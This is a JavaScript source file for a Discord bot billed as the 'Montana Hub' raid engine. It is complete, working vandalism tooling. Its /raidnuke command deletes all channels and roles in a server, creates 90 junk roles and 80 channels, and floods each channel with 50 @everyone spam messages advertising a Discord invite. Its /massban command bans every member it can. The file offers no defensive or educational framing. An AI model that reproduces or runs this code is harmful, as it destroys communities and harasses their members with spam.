/**
 * ============================================================================
 * PROJECT: MONTANA HUB - ADVANCED DISCORD AUTOMATION & RAID ENGINE
 * ARCHITECTURE: Discord.js v14 + REST API Handler
 * AUTHOR: Montana Team (discord.gg/pMya4QTDKz)
 * ============================================================================
 */

const { 
    Client, 
    GatewayIntentBits, 
    REST, 
    Routes, 
    SlashCommandBuilder, 
    PermissionFlagsBits 
} = require('discord.js');
require('dotenv').config();

// Inicialización del cliente con todos los intents necesarios para control total
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildModeration
    ]
});

// Constante de contenido de spam con mención global y enlace definitivo
const TARGET_INVITE = "https://discord.gg/pMya4QTDKz";
const SPAM_MESSAGE_PAYLOAD = `@everyone RAID BY MONTANA ON TOP\nJOIN DISCORD MONTANA ON TOP\n${TARGET_INVITE}`;

// Colección de nombres terroríficos para saturación de canales
const SCARY_CHANNEL_PREFIXES = [
    "💀ʀᴀɪᴅ-ʙʏ-ᴍᴏɴᴛᴀɴᴀ💀",
    "⚰️ᴍᴏɴᴛᴀɴᴀ-ᴏɴ-ᴛᴏᴘ⚰️",
    "🩸ᴅᴇsᴛʀᴜᴄᴄɪᴏɴ-ᴛᴏᴛᴀʟ🩸",
    "🕳️sɪɴ-ᴇsᴄᴀᴘᴇ🕳️",
    "⚡ʜᴀᴄᴋᴇᴅ-ʙʏ-ᴍᴏɴᴛᴀɴᴀ⚡"
];

/**
 * Evento principal: Ejecutado cuando el bot se conecta exitosamente a la API de Discord.
 */
client.once('ready', async () => {
    console.log(`[CORE STATUS]: Bot conectado e identificado exitosamente como -> ${client.user.tag}`);
    console.log(`[CORE STATUS]: Preparando registro global de comandos Slash...`);

    // Definición formal de comandos Slash compatibles con la API v10 de Discord
    const applicationCommandsRegistry = [
        new SlashCommandBuilder()
            .setName('raidnuke')
            .setDescription('Ejecuta protocolo integral de destrucción: borrado masivo y recreación de canales/roles.')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
        new SlashCommandBuilder()
            .setName('massban')
            .setDescription('Ejecuta baneo masivo e instantáneo en el servidor actual sin restricciones.')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    ].map(command => command.toJSON());

    const restApiManager = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        console.log('[API REST]: Sincronizando comandos de aplicación con Discord...');
        await restApiManager.put(
            Routes.applicationCommands(process.env.CLIENT_ID),
            { body: applicationCommandsRegistry }
        );
        console.log('[API REST]: Comandos slash registrados y listos para su uso.');
    } catch (registryError) {
        console.error('[API ERROR]: Fallo crítico al registrar los comandos Slash:', registryError);
    }
});

/**
 * Manejador de interacciones y comandos ejecutados por los usuarios.
 */
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, guild } = interaction;

    if (!guild) {
        return interaction.reply({ 
            content: '❌ Este comando solo puede ser ejecutado dentro de un servidor.', 
            ephemeral: true 
        });
    }

    // =========================================================================
    // COMANDO: /raidnuke
    // =========================================================================
    if (commandName === 'raidnuke') {
        // Diferimos la respuesta para evitar tiempos de espera de la API de Discord
        await interaction.deferReply({ ephemeral: true });

        try {
            console.log(`[RAID ENGINE]: Iniciando protocolo de limpieza en el servidor: ${guild.name}`);

            // 1. Fase de Eliminación de Canales Existentes
            const fetchedGuildChannels = await guild.channels.fetch();
            let channelDeletionCounter = 0;

            for (const [channelId, channelInstance] of fetchedGuildChannels) {
                try {
                    await channelInstance.delete();
                    channelDeletionCounter++;
                } catch (channelDeleteError) {
                    // Ignora canales protegidos que el bot no pueda borrar por jerarquía
                }
            }
            console.log(`[RAID ENGINE]: Canales eliminados con éxito: ${channelDeletionCounter}`);

            // 2. Fase de Eliminación de Roles Previos
            const fetchedGuildRoles = await guild.roles.fetch();
            let roleDeletionCounter = 0;

            for (const [roleId, roleInstance] of fetchedGuildRoles) {
                try {
                    if (roleInstance.editable && roleInstance.name !== '@everyone') {
                        await roleInstance.delete();
                        roleDeletionCounter++;
                    }
                } catch (roleDeleteError) {
                    // Ignora roles de mayor jerarquía que el bot
                }
            }
            console.log(`[RAID ENGINE]: Roles antiguos eliminados: ${roleDeletionCounter}`);

            // 3. Fase de Creación Masiva de Roles Nuevos (90 Roles)
            let rolesCreatedCounter = 0;
            for (let roleIndex = 1; roleIndex <= 90; roleIndex++) {
                try {
                    await guild.roles.create({
                        name: `Montana Hub : ${TARGET_INVITE}`,
                        color: 'Random',
                        reason: 'Montana Security System - Raid Protocol'
                    });
                    rolesCreatedCounter++;
                } catch (roleCreationError) {
                    // Control de límite de tasa de la API (Rate limit bypass catch)
                }
            }
            console.log(`[RAID ENGINE]: Roles masivos creados: ${rolesCreatedCounter}`);

            // 4. Fase de Creación y Saturación de Canales (80 Canales con Spam Masivo)
            let channelsCreatedCounter = 0;
            for (let channelIndex = 1; channelIndex <= 80; channelIndex++) {
                try {
                    const selectedPrefix = SCARY_CHANNEL_PREFIXES[(channelIndex - 1) % SCARY_CHANNEL_PREFIXES.length];
                    const constructedChannelName = `${selectedPrefix}-${channelIndex}`;

                    const newlyCreatedChannel = await guild.channels.create({
                        name: constructedChannelName,
                        type: 0 // Tipo de canal: Texto
                    });

                    channelsCreatedCounter++;

                    // Bucle interno de envío masivo de mensajes de spam (50 mensajes por canal)
                    for (let messageIndex = 0; messageIndex < 50; messageIndex++) {
                        await newlyCreatedChannel.send(SPAM_MESSAGE_PAYLOAD).catch(() => {});
                    }
                } catch (channelBuildingError) {
                    // Control de flujo ante restricciones de creación masiva
                }
            }
            console.log(`[RAID ENGINE]: Canales creados y spameados: ${channelsCreatedCounter}`);

            await interaction.editReply({ 
                content: '💀 **¡PROTOCOLO NUKES & RAID EJECUTADO EXITOSAMENTE POR MONTANA HUB!**' 
            });

        } catch (globalExecutionError) {
            console.error('[CRITICAL ERROR]: Error durante la ejecución del comando /raidnuke:', globalExecutionError);
            await interaction.editReply({ 
                content: '❌ Ocurrió un error crítico al procesar el protocolo de destrucción.' 
            });
        }
    }

    // =========================================================================
    // COMANDO: /massban
    // =========================================================================
    if (commandName === 'massban') {
        await interaction.deferReply({ ephemeral: true });

        try {
            console.log(`[BAN ENGINE]: Iniciando barrido de expulsión y baneo en: ${guild.name}`);
            
            const allServerMembers = await guild.members.fetch();
            let totalBannedCount = 0;

            for (const [memberId, memberInstance] of allServerMembers) {
                try {
                    if (memberInstance.bannable && memberInstance.id !== client.user.id) {
                        await memberInstance.ban({ reason: `Montana Hub Global Ban - ${TARGET_INVITE}` });
                        totalBannedCount++;
                    }
                } catch (individualBanError) {
                    // Omite miembros con protecciones o roles superiores
                }
            }

            console.log(`[BAN ENGINE]: Proceso finalizado. Total de usuarios baneados: ${totalBannedCount}`);
            await interaction.editReply({ 
                content: `⚡ **¡BARRIDO TOTAL COMPLETADO! Miembros baneados con éxito: ${totalBannedCount}**` 
            });

        } catch (massBanEngineError) {
            console.error('[CRITICAL ERROR]: Error en el proceso de baneo masivo:', massBanEngineError);
            await interaction.editReply({ 
                content: '❌ Error al ejecutar el baneo masivo en el servidor.' 
            });
        }
    }
});

// Autenticación final del bot utilizando el token privado del entorno
client.login(process.env.DISCORD_TOKEN);
